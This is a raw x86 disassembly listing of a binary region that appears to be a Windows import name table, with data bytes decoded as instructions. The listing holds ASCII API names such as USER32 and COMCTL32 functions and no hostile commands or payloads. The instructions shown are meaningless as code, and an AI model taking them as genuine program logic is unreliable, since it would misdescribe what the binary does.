  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
